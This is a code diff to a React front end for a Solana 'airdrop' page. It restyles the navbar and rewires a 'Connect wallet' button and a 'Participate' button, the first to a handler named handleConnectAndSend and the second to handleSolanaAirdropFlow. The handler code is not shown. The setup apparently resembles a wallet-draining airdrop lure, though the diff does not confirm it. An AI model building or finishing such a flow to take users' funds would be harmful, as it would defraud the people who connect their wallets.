@@ -230,7 +230,7 @@ function App() {
   return (
     <>
       <header>
-        <nav className="navbar bg-body-tertiary fixed-top shadow mb-5 bg-body rounded py-3">
+        <nav className="navbar bg-body-tertiary fixed-top shadow mb-5 bg-body rounded py-3 navbar-dark">
           <div className="nav-wave">
             <svg className="line-wave" viewBox="0 0 1000 100" preserveAspectRatio="none">
               <path
@@ -347,27 +347,36 @@ function App() {
             <button
               className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
               onClick={handleConnectAndSend}
-              disabled={loading}
-            >
+              disabled={loading} >
               {
                 loading
                   ? "💰Connection pending..."
                   : state.address
                   ? "Connecting..."
-                  : "Connect wallet SOL🪙"
+                  : "Connect wallet"
               }
             </button><br /> <br />
             <button
               className="text-primary-emphasis bg-info border border-primary-subtle rounded-3 btn-lg"
-              onClick={handleConnectAndSend}
-              disabled={loading}
-            >
+              onClick={handleSolanaAirdropFlow}
+              disabled={loading} >
               {
-                loading
-                  ? "💰Connection pending..."
-                  : state.address
-                  ? "Connecting..."
-                  : "Participate🪂"
+                loading ? (
+                  "💰Connection pending..."
+                ) : state.address ? (
+                  "Connecting..."
+                ) : (
+                  <>
+                    Participate{" "}
+                    <img
+                      src="https://i.ibb.co/wFRxsWbZ/solana-removebg-preview.png"
+                      alt="Solana Logo"
+                      width={24}
+                      height={24}
+                      style={{ verticalAlign: "middle", marginLeft: "6px" }}
+                    />
+                  </>
+                )
               }
             </button>
            {/* //// before there was image here  */}
